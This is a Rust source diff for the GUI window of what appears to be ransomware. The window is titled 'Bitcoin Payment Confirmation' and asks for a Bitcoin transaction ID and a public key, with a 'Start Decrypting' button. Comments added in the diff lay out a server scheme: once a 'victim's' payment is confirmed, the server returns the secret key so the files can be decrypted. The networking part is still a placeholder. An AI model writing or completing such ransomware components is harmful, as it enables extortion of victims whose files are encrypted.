@@ -9,21 +9,25 @@ pub struct PaymentWindow {
     #[nwg_events(OnWindowClose: [PaymentWindow::close])]
     window: nwg::Window,
 
+    // Title
     #[nwg_control(text: "Bitcoin Payment Confirmation", position: (20, 10), size: (400, 32), flags: "VISIBLE")]
     title_label: nwg::Label,
 
+    // Transactio ID Field
     #[nwg_control(text: "Transaction ID:", position: (20, 60), size: (120, 25), flags: "VISIBLE")]
     tx_id_label: nwg::Label,
 
     #[nwg_control(text: "", position: (150, 60), size: (530, 25), flags: "VISIBLE")]
     tx_id_input: nwg::TextInput,
 
+    // Public Key Field
     #[nwg_control(text: "Public Key:", position: (20, 100), size: (120, 25), flags: "VISIBLE")]
     pub_key_label: nwg::Label,
 
     #[nwg_control(text: "", position: (150, 100), size: (530, 25), flags: "VISIBLE")]
     pub_key_input: nwg::TextInput,
 
+    // Payment Checker Button
     #[nwg_control(text: "Start Decrypting", position: (570, 140), size: (110, 25), flags: "VISIBLE")]
     #[nwg_events(OnButtonClick: [PaymentWindow::on_start_decrypt])]
     decrypt_button: nwg::Button,
@@ -49,13 +53,14 @@ impl PaymentWindow {
         self.status.set_text("Sending confirmation to server...");
 
         // TODO: Send tx_id and pub_key to server
-        // You can use tokio::spawn to run async code here
+        // Idea: Have array on server that has all received payments (stored as transaction IDs)
+        // If transaction ID sent by victim is found on the array:
+        // Delete transaction ID from array, use pk to find sk, send back sk and start decryption
         let tx_id_clone = tx_id.clone();
         let pub_key_clone = pub_key.clone();
 
         std::thread::spawn(move || {
-            // This is where you would send data to the server
-            // For now, just a placeholder
+            //  Send data to server
             println!("Transaction ID: {}", tx_id_clone);
             println!("Public Key: {}", pub_key_clone);
         });
@@ -69,7 +74,6 @@ pub fn show_confirmation_window() {
     
     let _app = PaymentWindow::build_ui(Default::default()).expect("Failed to build UI");
 
-    // Larger title font
     let mut title_font = nwg::Font::default();
     nwg::Font::builder()
         .family("Segoe UI")
